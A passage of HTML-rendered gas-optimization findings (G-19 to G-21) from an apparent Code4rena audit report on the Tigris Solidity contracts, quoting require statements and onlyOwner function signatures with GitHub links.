class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">252</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">expireEpoch</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">] ? </span><span class=\"mtk4\">true</span><span class=\"mtk1\"> : </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L238</p>\n<h2 id=\"g19--require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" style=\"position:relative;\"><a href=\"#g19--require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function\" aria-label=\"g19  require or revert statements that check input arguments should be at the top of the function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑19]  <code>require()</code> or <code>revert()</code> statements that check input arguments should be at the top of the function</h2>\n<p>Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (<strong>2100 gas*</strong>) in a function that may ultimately revert in the unhappy case.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"166\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit expensive op on line 65</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;BadID&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L66</p>\n<h2 id=\"g20--use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" style=\"position:relative;\"><a href=\"#g20--use-custom-errors-rather-than-revertrequire-strings-to-save-gas\" aria-label=\"g20  use custom errors rather than revertrequire strings to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑20]  Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</h2>\n<p>Custom errors are available from solidity version 0.8.4. Custom errors save <a href=\"https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746\"><strong>~50 gas</strong></a> each time they’re hit by <a href=\"https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth\">avoiding having to allocate and store the revert string</a>. Not defining the strings also save deployment gas</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"167\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">153</span><span class=\"mtk1\">           </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">               </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">messageFee</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">155</span><span class=\"mtk1\">               </span><span class=\"mtk8\">&quot;Must send enough value to cover messageFee&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">156</span><span class=\"mtk1\">:          );</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L153-L156</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"168\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">116</span><span class=\"mtk1\">                   </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">                       </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\">+</span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\">*</span><span class=\"mtk7\">2</span><span class=\"mtk1\">/</span><span class=\"mtk7\">100</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">                       </span><span class=\"mtk12\">_priceData</span><span class=\"mtk1\">.</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\">-</span><span class=\"mtk12\">assetChainlinkPrice</span><span class=\"mtk1\">*</span><span class=\"mtk7\">2</span><span class=\"mtk1\">/</span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!chainlinkPrice&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:                  );</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L116-L119</p>\n<h2 id=\"g21--functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" style=\"position:relative;\"><a href=\"#g21--functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\" aria-label=\"g21  functions guaranteed to revert when called by normal users can be marked payable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑21]  Functions guaranteed to revert when called by normal users can be marked <code>payable</code></h2>\n<p>If a function modifier such as <code>onlyOwner</code> is used, the function will revert if a normal user tries to pay the function. Marking the function as <code>payable</code> will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are\n<code>CALLVALUE</code>(2),<code>DUP1</code>(3),<code>ISZERO</code>(3),<code>PUSH2</code>(3),<code>JUMPI</code>(10),<code>PUSH1</code>(3),<code>DUP1</code>(3),<code>REVERT</code>(0),<code>JUMPDEST</code>(1),<code>POP</code>(2), which costs an average of about <strong>21 gas per call</strong> to the function, in addition to the extra deployment cost</p>\n<p><em>There are 69 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"169\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createLock</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">58            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">59            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">60            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_period</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">61            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">62:       ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyManager</span><span class=\"mtk1\">() </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">97</span><span class=\"mtk1\">        </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">extendLock</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">98            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">99            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">100           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">101           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_period</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">102           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sender</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">103:      ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyManager</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">137</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">release</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">138           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">139           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_releaser</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">140:      ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyManager</span><span class=\"mtk1\">() </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lockAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">168</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">169           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">170           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_claimer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">171:      ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyManager</span><span class=\"mtk1\">() </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">196</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimDebt</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">197           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_user</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">198           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">199:      ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyManager</span><span class=\"mtk1\">() </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">349</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addAsset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">357</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setAllowedAsset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">362</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setBaseURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newBaseURI</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">366</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setManager</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">367           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_manager</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">368:      ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">() {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L57-L62</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"170\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">46</span><span class=\"mtk1\">:       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setBaseURI</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newBaseURI</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mintMany</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setTrustedAddress</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_chainId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_contract</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">236</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setGas</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_gas</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">240</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setEndpoint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ILayerZeroEndpoint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_endpoint</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">300</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addAsset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">307</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setAllowedAsset</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">311</span><span class=\"mtk1\">:      </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMaxBridge</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_max</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L46</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"171\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">127</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">editAsset</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">128           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">129           </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_isAllowed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">130:      ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">() {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sendNFTs</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">139           </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ids</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">140:      ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\">() {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L127-L130</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"172\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PairsContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span 